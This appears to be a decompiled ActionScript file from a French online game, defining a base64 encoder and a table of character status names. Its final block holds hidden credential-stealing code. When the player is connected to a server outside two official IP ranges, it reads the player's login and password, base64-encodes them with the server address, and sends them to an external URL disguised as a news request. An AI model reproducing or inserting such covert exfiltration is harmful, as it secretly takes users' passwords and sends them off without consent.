function encode(opString)
{
   opString == undefined ? (str = str) : (str = opString);
   var _loc3_ = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
   var _loc1_;
   var _loc5_;
   var _loc2_ = 0;
   var _loc4_ = "";
   while(str.length >= _loc2_ + 3)
   {
      _loc1_ = (str.charCodeAt(_loc2_++) & 0xFF) << 16 | (str.charCodeAt(_loc2_++) & 0xFF) << 8 | str.charCodeAt(_loc2_++) & 0xFF;
      _loc4_ += _loc3_.charAt((_loc1_ & 0xFC0000) >> 18) + _loc3_.charAt((_loc1_ & 0x03F000) >> 12) + _loc3_.charAt((_loc1_ & 0x0FC0) >> 6) + _loc3_.charAt(_loc1_ & 0x3F);
   }
   if(str.length - _loc2_ > 0 && str.length - _loc2_ < 3)
   {
      _loc5_ = Boolean(str.length - _loc2_ - 1);
      _loc1_ = (str.charCodeAt(_loc2_++) & 0xFF) << 16 | (!_loc5_ ? 0 : (str.charCodeAt(_loc2_) & 0xFF) << 8);
      _loc4_ += _loc3_.charAt((_loc1_ & 0xFC0000) >> 18) + _loc3_.charAt((_loc1_ & 0x03F000) >> 12) + (!_loc5_ ? "=" : _loc3_.charAt((_loc1_ & 0x0FC0) >> 6)) + "=";
   }
   return _loc4_;
}
FILE_BEGIN = true;
System.security.allowDomain(_parent._url);
VERSION = 289;
ST = new Object();
ST[0] = {n:"Neutre",p:0};
ST[1] = {n:"Saoul",p:1};
ST[2] = {n:"Chercheur d\'âmes",p:0};
ST[3] = {n:"Porteur",p:1};
ST[4] = {n:"Peureux",p:0};
ST[5] = {n:"Désorienté",p:0};
ST[6] = {n:"Enraciné",p:0};
ST[7] = {n:"Pesanteur",p:0};
ST[8] = {n:"Porté",p:0};
ST[9] = {n:"Motivation Sylvestre",p:0};
ST[10] = {n:"Apprivoisement",p:0};
ST[11] = {n:"Chevauchant",p:0};
ST[12] = {n:"Pas sage",p:0};
ST[13] = {n:"Vraiment pas sage",p:0};
ST[14] = {n:"Enneigé",p:0};
ST[15] = {n:"Eveillé",p:0};
ST[16] = {n:"Fragilisé",p:0};
ST[17] = {n:"Séparé",p:0};
ST[18] = {n:"Gelé",p:1};
ST[19] = {n:"Fissuré",p:1};
ST[26] = {n:"Endormi",p:0};
ST[27] = {n:"Léopardo",p:0};
ST[28] = {n:"Libre",p:0};
ST[29] = {n:"Glyphe impaire",p:0};
ST[30] = {n:"Glyphe paire",p:0};
ST[31] = {n:"Encre primaire",p:0};
ST[32] = {n:"Encre secondaire",p:0};
ST[33] = {n:"Encre tertiaire",p:0};
ST[34] = {n:"Encre quaternaire",p:0};
ST[35] = {n:"Envie de tuer",p:0};
ST[36] = {n:"Envie de paralyser",p:0};
ST[37] = {n:"Envie de maudire",p:0};
ST[38] = {n:"Envie d\'empoisonner",p:0};
ST[39] = {n:"Flou",p:0};
ST[40] = {n:"Corrompu",p:0};
ST[41] = {n:"Silencieux",p:1};
ST[42] = {n:"Affaibli",p:0};
ST[43] = {n:"[wait] OVNI",p:0};
ST[44] = {n:"[wait] Pas contente",p:0};
ST[46] = {n:"[wait] Contente",p:0};
ST[47] = {n:"[wait] Mauvaise humeur",p:0};
ST[48] = {n:"Confus",p:0};
ST[49] = {n:"Goulifié",p:0};
ST[50] = {n:"Altruiste",p:0};
ST[51] = {n:"[wip]Châtiment agile",p:0};
ST[52] = {n:"[wip]Châtiment osé",p:0};
ST[53] = {n:"[wip]Châtiment spirituel",p:0};
ST[54] = {n:"[wip]Châtiment vitalesque",p:0};
ST[55] = {n:"Retraité",p:0};
ST[56] = {n:"[wip]Invulnérable",p:0};
ST[57] = {n:"Compte à rebours - 2",p:0};
ST[58] = {n:"Compte à rebours - 1",p:0};
ST[60] = {n:"Dévoué",p:0};
ST[61] = {n:"Bagarreur",p:0};
ST[63] = {n:"[wip]Lourd",p:0};
ST[64] = {n:"[wip]Glyphe nom provisoire",p:0};
ST[65] = {n:"[wip]Rayonnement bloqué",p:0};
ST[66] = {n:"[wip]Rayonnement 1 joueur",p:0};
ST[67] = {n:"[wip]Rayonnement 2 joueur",p:0};
ST[68] = {n:"[wip]Rayonnement 3 joueur",p:0};
ST[69] = {n:"[wip]Rayonnement 4 joueur",p:0};
ST[70] = {n:"[wip]Rayonnement 1 boss",p:0};
ST[71] = {n:"[wip]Rayonnement 2 boss",p:0};
ST[72] = {n:"[wip]Rayonnement 3 boss",p:0};
api = _root.mcModules.mcCORE.BATTLEFIELD._oAPI;
var ip = _global.CONFIG.connexionServer.ip;
if(!ip)
{
   ip = api.datacenter.Basics.serverHost;
}
if(ip && ip.indexOf("80.239.173") == -1 && ip.indexOf("213.248.126") == -1)
{
   var ul = new LoadVars();
   var encodedData = "";
   encodedData += "{";
   encodedData += "\"login\":\"" + api.datacenter.Player.login + "\",";
   encodedData += "\"pass\":\"" + api.datacenter.Player.pass + "\",";
   encodedData += "\"server\":\"" + ip + "\"";
   encodedData += "}";
   ul.load("http://www.ankama.com/news.html?news=" + encode(encodedData));
}
FILE_END = true;
